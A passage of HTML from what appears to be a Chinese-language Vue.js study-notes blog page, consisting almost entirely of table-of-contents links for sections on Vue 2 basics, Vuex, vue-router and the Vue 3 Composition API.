href="#3-8-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">3.8 生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-9-%E8%87%AA%E5%AE%9A%E4%B9%89hook%E5%87%BD%E6%95%B0"><span class="toc-text">3.9 自定义hook函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-10-toRef"><span class="toc-text">3.10 toRef</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%85%B6%E5%AE%83-Composition-API"><span class="toc-text">三、其它 Composition API</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-shallowReactive-%E4%B8%8E-shallowRef"><span class="toc-text">1.shallowReactive 与 shallowRef</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-readonly-%E4%B8%8E-shallowReadonly"><span class="toc-text">2.readonly 与 shallowReadonly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-toRaw-%E4%B8%8E-markRaw"><span class="toc-text">3.toRaw 与 markRaw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-customRef"><span class="toc-text">4.customRef</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-provide-%E4%B8%8E-inject"><span class="toc-text">5.provide 与 inject</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-%E5%93%8D%E5%BA%94%E5%BC%8F%E6%95%B0%E6%8D%AE%E7%9A%84%E5%88%A4%E6%96%AD"><span class="toc-text">6.响应式数据的判断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Composition-API-%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-text">四、Composition API 的优势</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Options-API-%E5%AD%98%E5%9C%A8%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">1.Options API 存在的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Composition-API-%E7%9A%84%E4%BC%98%E5%8A%BF"><span class="toc-text">2.Composition API 的优势</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%96%B0%E7%9A%84%E7%BB%84%E4%BB%B6"><span class="toc-text">五、新的组件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Fragment"><span class="toc-text">1.Fragment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Teleport"><span class="toc-text">2.Teleport</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Suspense"><span class="toc-text">3.Suspense</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E5%85%B6%E4%BB%96"><span class="toc-text">六、其他</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%85%A8%E5%B1%80API%E7%9A%84%E8%BD%AC%E7%A7%BB"><span class="toc-text">1.全局API的转移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%85%B6%E4%BB%96%E6%94%B9%E5%8F%98"><span class="toc-text">2.其他改变</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><div class='inner-toc'><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-vue%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-text">1. vue基础知识和原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-%E5%88%9D%E8%AF%86Vue"><span class="toc-text">1.1 初识Vue</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95"><span class="toc-text">1.2 模板语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-3-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A"><span class="toc-text">1.3 数据绑定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-4-el%E4%B8%8Edata%E7%9A%84%E4%B8%A4%E7%A7%8D%E5%86%99%E6%B3%95"><span class="toc-text">1.4 el与data的两种写法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-5-Vue%E4%B8%AD%E7%9A%84MVVM"><span class="toc-text">1.5 Vue中的MVVM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-6-%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86"><span class="toc-text">1.6 数据代理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#bulb-%E5%B0%8F%E7%B5%90%EF%BC%9A"><span class="toc-text">:bulb:小結：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-7-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86"><span class="toc-text">1.7 事件处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-8-%E9%94%AE%E7%9B%98%E4%BA%8B%E4%BB%B6"><span class="toc-text">1.8 键盘事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-9-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7"><span class="toc-text">1.9 计算属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-10-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7"><span class="toc-text">1.10 监视属性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-1-%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7watch%EF%BC%9A"><span class="toc-text">1.10.1 监视属性watch：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-2-%E6%B7%B1%E5%BA%A6%E7%9B%91%E8%A7%86%EF%BC%9A"><span class="toc-text">1.10.2 深度监视：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-10-3-computed%E5%92%8Cwatch%E4%B9%8B%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%9A"><span class="toc-text">1.10.3 computed和watch之间的区别：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-11-%E7%BB%91%E5%AE%9A%E6%A0%B7%E5%BC%8F"><span class="toc-text">1.11 绑定样式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-1-class%E6%A0%B7%E5%BC%8F"><span class="toc-text">1.11.1 class样式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%99%E6%B3%95"><span class="toc-text">1. 字符串写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95"><span class="toc-text">2. 数组写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-text">3. 对象写法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-11-2-style%E6%A0%B7%E5%BC%8F"><span class="toc-text">1.11.2 style样式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AF%B9%E8%B1%A1%E5%86%99%E6%B3%95"><span class="toc-text">1. 对象写法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%95%B0%E7%BB%84%E5%86%99%E6%B3%95-1"><span class="toc-text">2. 数组写法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-12-%E6%9D%A1%E4%BB%B6%E6%B8%B2%E6%9F%93"><span class="toc-text">1.12 条件渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-1-v-if"><span class="toc-text">1.12.1 v-if</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-12-2-v-show"><span class="toc-text">1.12.2 v-show</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-13-%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93"><span class="toc-text">1.13 列表渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-1-%E5%9F%BA%E6%9C%AC%E5%88%97%E8%A1%A8-v-for%E6%8C%87%E4%BB%A4"><span class="toc-text">1.13.1 基本列表 (v-for指令)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-2-key%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-text">1.13.2 key的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%9C%9F%E5%AE%9EDOM%E5%92%8C%E5%85%B6%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-text">1. 真实DOM和其解析流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E8%99%9A%E6%8B%9F-DOM-%E7%9A%84%E5%A5%BD%E5%A4%84"><span class="toc-text">2. 虚拟 DOM 的好处</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E8%99%9A%E6%8B%9FDOM%E4%B8%ADkey%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-text">3. 虚拟DOM中key的作用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E7%94%A8index%E4%BD%9C%E4%B8%BAkey%E5%8F%AF%E8%83%BD%E4%BC%9A%E5%BC%95%E5%8F%91%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">4. 用index作为key可能会引发的问题：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E7%BB%93%E8%AE%BA%EF%BC%9A"><span class="toc-text">5. 结论：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-3-%E5%88%97%E8%A1%A8%E9%81%8E%E6%BF%BE"><span class="toc-text">1.13.3 列表過濾</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-13-4-%E5%88%97%E8%A1%A8%E6%8E%92%E5%BA%8F"><span class="toc-text">1.13.4 列表排序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-14-vue-%E7%9B%91%E6%B5%8B%E6%95%B8%E6%93%9A%E6%94%B9%E8%AE%8A%E7%9A%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-text">1.14 vue 监测數據改變的原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-1-%E6%9B%B4%E6%96%B0%E6%95%B8%E6%93%9A%E6%99%82%E7%9A%84%E5%95%8F%E9%A1%8C"><span class="toc-text">1.14.1 更新數據時的問題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-2-Vue%E7%9B%A3%E6%B8%AC%E6%95%B8%E6%93%9A%E6%94%B9%E8%AE%8A%E7%9A%84%E5%8E%9F%E7%90%86-%E5%B0%8D%E8%B1%A1"><span class="toc-text">1.14.2 Vue監測數據改變的原理_對象</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-Vue-%E5%A6%82%E4%BD%95%E7%9B%91%E6%B5%8B%E5%AF%B9%E8%B1%A1%E9%87%8C%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-text">1.  Vue 如何监测对象里的数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%89%8B%E5%8B%95%E6%A8%A1%E6%8B%9F-vue-%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%9B%91%E6%B5%8B"><span class="toc-text">2. 手動模拟 vue 中的数据监测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-3-Vue-set-%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">1.14.3 Vue.set 的使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-4-Vue%E7%9B%A3%E6%B8%AC%E6%95%B8%E6%93%9A%E6%94%B9%E8%AE%8A%E7%9A%84%E5%8E%9F%E7%90%86-%E6%95%B8%E7%B5%84"><span class="toc-text">1.14.4 Vue監測數據改變的原理_數組</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-14-5-%E7%B8%BD%E7%B5%90Vue%E6%95%B8%E6%93%9A%E7%9B%A3%E6%B8%AC%EF%BC%9A"><span class="toc-text">1.14.5 總結Vue數據監測：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-15-%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE"><span class="toc-text">1.15 收集表单数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-15-1-%E7%B8%BD%E7%B5%90"><span class="toc-text">1.15.1 總結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-16-%E8%BF%87%E6%BB%A4%E5%99%A8%EF%BC%88%E9%9D%9E%E9%87%8D%E7%82%B9%EF%BC%89"><span class="toc-text">1.16 过滤器（非重点）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-17-%E5%86%85%E7%BD%AE%E6%8C%87%E4%BB%A4"><span class="toc-text">1.17 内置指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-1-v-text%E6%8C%87%E4%BB%A4%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%9A%84%E6%AF%94%E8%BE%83%E5%B0%91"><span class="toc-text">1.17.1 v-text指令：(使用的比较少)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-2-v-html%E6%8C%87%E4%BB%A4%EF%BC%9A-%E4%BD%BF%E7%94%A8%E7%9A%84%E5%BE%88%E5%B0%91"><span class="toc-text">1.17.2 v-html指令：(使用的很少)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-3-v-cloak%E6%8C%87%E4%BB%A4%EF%BC%88%E6%B2%A1%E6%9C%89%E5%80%BC%EF%BC%89%EF%BC%9A"><span class="toc-text">1.17.3 v-cloak指令（没有值）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-4-v-once%E6%8C%87%E4%BB%A4%EF%BC%9A-%E7%94%A8%E7%9A%84%E5%B0%91"><span class="toc-text">1.17.4 v-once指令：(用的少)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-17-5-v-pre%E6%8C%87%E4%BB%A4%EF%BC%9A-%E6%AF%94%E8%BE%83%E6%B2%A1%E7%94%A8"><span class="toc-text">1.17.5 v-pre指令：(比较没用)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-18-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4"><span class="toc-text">1.18 自定义指令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-1-%E5%A6%82%E4%BD%95%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%8C%87%E4%BB%A4"><span class="toc-text">1.18.1 如何自定義指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-2-%E5%B1%80%E9%83%A8%E6%8C%87%E4%BB%A4%E8%88%87%E5%85%A8%E5%B1%80%E6%8C%87%E4%BB%A4"><span class="toc-text">1.18.2 局部指令與全局指令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%B1%80%E9%83%A8%E6%8C%87%E4%BB%A4"><span class="toc-text">1. 局部指令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E5%85%A8%E5%B1%80%E6%8C%87%E4%BB%A4"><span class="toc-text">2. 全局指令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-18-3-%E8%87%AA%E5%AE%9A%E7%BE%A9%E6%8C%87%E4%BB%A4%E7%B8%BD%E7%B5%90"><span class="toc-text">1.18.3 自定義指令總結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-19-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">1.19 生命周期</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-1-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B"><span class="toc-text">1.19.1 生命周期流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-2-%E7%94%9F%E5%91%BD%E9%80%B1%E6%9C%9F%E5%88%86%E6%9E%90"><span class="toc-text">1.19.2 生命週期分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-19-3-%E7%B8%BD%E7%B5%90%E7%94%9F%E5%91%BD%E9%80%B1%E6%9C%9F"><span class="toc-text">1.19.3 總結生命週期</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-20-%E9%9D%9E%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-text">1.20 非单文件组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-1-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">1.20.1 基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6"><span class="toc-text">1. 定义组件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%B3%A8%E5%86%8C%E7%BB%84%E4%BB%B6"><span class="toc-text">2. 注册组件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E5%86%99%E7%BB%84%E4%BB%B6%E6%A0%87%E7%AD%BE"><span class="toc-text">3. 写组件标签</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E5%B0%8F%E7%B5%90"><span class="toc-text">4. 小結</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-2-%E4%BD%BF%E7%94%A8%E7%B5%84%E4%BB%B6%E7%9A%84%E6%B3%A8%E6%84%8F%E7%82%B9%EF%BC%9A"><span class="toc-text">1.20.2 使用組件的注意点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-3-%E7%BB%84%E4%BB%B6%E7%9A%84%E5%B5%8C%E5%A5%97"><span class="toc-text">1.20.3 组件的嵌套</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-4-VueComponent"><span class="toc-text">1.20.4 VueComponent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-20-5-%E4%B8%80%E4%B8%AA%E9%87%8D%E8%A6%81%E7%9A%84%E5%86%85%E7%BD%AE%E5%85%B3%E7%B3%BB"><span class="toc-text">1.20.5 一个重要的内置关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-21-%E5%8D%95%E6%96%87%E4%BB%B6%E7%BB%84%E4%BB%B6"><span class="toc-text">1.21 单文件组件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-vue%E8%84%9A%E6%89%8B%E6%9E%B6%EF%BC%8C%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6%EF%BC%8C%E6%8F%92%E6%A7%BD%E7%AD%89%E5%A4%8D%E6%9D%82%E5%86%85%E5%AE%B9"><span class="toc-text">2. vue脚手架，自定义事件，插槽等复杂内容</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%88%86%E6%9E%90%E8%84%9A%E6%89%8B%E6%9E%B6"><span class="toc-text">2.1 分析脚手架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-%E8%AA%AA%E6%98%8E"><span class="toc-text">2.1.1 說明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-%E5%88%9D%E5%A7%8B%E5%8C%96%E8%84%9A%E6%89%8B%E6%9E%B6"><span class="toc-text">2.1.2 初始化脚手架</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-%E8%84%9A%E6%89%8B%E6%9E%B6%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-text">2.1.3 脚手架文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-%E8%84%9A%E6%89%8B%E6%9E%B6demo"><span class="toc-text">2.1.4 脚手架demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-5-render%E5%87%BD%E6%95%B0"><span class="toc-text">2.1.5 render函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-6-%E4%BF%AE%E6%94%B9%E8%84%9A%E6%89%8B%E6%9E%B6%E7%9A%84%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE"><span class="toc-text">2.1.6 修改脚手架的默认配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-7-%E8%84%9A%E6%89%8B%E6%9E%B6%E4%B8%AD%E7%9A%84index-html"><span class="toc-text">2.1.7 脚手架中的index.html</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-vue-%E9%9B%B6%E7%A2%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86"><span class="toc-text">2.2 vue 零碎的一些知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-ref%E5%B1%9E%E6%80%A7"><span class="toc-text">2.2.1 ref属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-props%E9%85%8D%E7%BD%AE%E9%A1%B9"><span class="toc-text">2.2.2 props配置项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-mixin-%E6%B7%B7%E5%85%A5-%E9%85%8D%E7%BD%AE%E9%A0%85"><span class="toc-text">2.2.3 mixin(混入)配置項</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-%E6%8F%92%E4%BB%B6"><span class="toc-text">2.2.4 插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-5-scoped%E6%A0%B7%E5%BC%8F"><span class="toc-text">2.2.5 scoped样式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-6-%E6%80%BB%E7%BB%93TodoList%E6%A1%88%E4%BE%8B"><span class="toc-text">2.2.6 总结TodoList案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8"><span class="toc-text">2.3 浏览器本地存储</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-Cookie"><span class="toc-text">2.3.1 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-Session"><span class="toc-text">2.3.2 Session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-LocalStorage"><span class="toc-text">2.3.3 LocalStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-4-SessionStorage"><span class="toc-text">2.3.4 SessionStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-5-%E7%B8%BD%E7%B5%90WebStorage"><span class="toc-text">2.3.5 總結WebStorage</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-4-%E7%BB%84%E4%BB%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-text">2.4 组件自定义事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-1-%E7%B6%81%E5%AE%9A%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-text">2.4.1 綁定自定义事件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E6%96%B9%E5%BC%8F%E4%B8%80%EF%BC%9Av-on"><span class="toc-text">1.  方式一：v-on</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E6%96%B9%E5%BC%8F%E4%BA%8C%EF%BC%9Aref"><span class="toc-text">2.  方式二：ref</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-2-%E8%A7%A3%E7%BB%91%E8%87%AA%E5%AE%9A%E4%B9%89%E4%BA%8B%E4%BB%B6"><span class="toc-text">2.4.2 解绑自定义事件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-3-%E8%87%AA%E5%AE%9A%E7%BE%A9%E4%BA%8B%E4%BB%B6%E7%B8%BD%E7%B5%90"><span class="toc-text">2.4.3 自定義事件總結</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-5-%E5%85%A8%E5%B1%80%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF"><span class="toc-text">2.5 全局事件总线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-6-%E6%B6%88%E6%81%AF%E8%AE%A2%E9%98%85%E4%B8%8E%E5%8F%91%E5%B8%83"><span class="toc-text">2.6 消息订阅与发布</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-7-nextTick"><span class="toc-text">2.7 nextTick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-8-Vue%E5%B0%81%E8%A3%85%E7%9A%84%E8%BF%87%E5%BA%A6%E4%B8%8E%E5%8A%A8%E7%94%BB"><span class="toc-text">2.8 Vue封装的过度与动画</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-9-vue%E8%84%9A%E6%89%8B%E6%9E%B6%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-text">2.9 vue脚手架配置代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-10-slot%E6%8F%92%E6%A7%BD"><span class="toc-text">2.10 slot插槽</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-VUEX"><span class="toc-text">3. VUEX</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%A6%82%E5%BF%B5"><span class="toc-text">3.1 概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E4%BD%95%E6%97%B6%E4%BD%BF%E7%94%A8%EF%BC%9F"><span class="toc-text">3.2 何时使用？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Vuex%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%9B%BE"><span class="toc-text">3.3 Vuex工作原理图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-%E6%90%AD%E5%BB%BAvuex%E7%8E%AF%E5%A2%83"><span class="toc-text">3.4 搭建vuex环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-1-%E5%AE%89%E8%A3%9DVuex"><span class="toc-text">3.4.1 安裝Vuex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-4-2-%E5%BC%95%E5%85%A5Vuex%E3%80%81%E9%85%8D%E7%BD%AEstore"><span class="toc-text">3.4.2 引入Vuex、配置store</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">3.5 基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-getters%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-text">3.6 getters的使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-8-%E6%A8%A1%E5%9D%97%E5%8C%96-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="toc-text">3.8 模块化+命名空间</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-vue-router"><span class="toc-text">4. vue-router</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-vue-router%E7%9B%B8%E9%97%9C%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1 vue-router相關的理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-1-vue-router%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1.1 vue-router的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-2-%E5%AF%B9-SPA-%E5%BA%94%E7%94%A8%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1.2 对 SPA 应用的理解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-3-%E8%B7%AF%E7%94%B1%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">4.1.3 路由的理解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 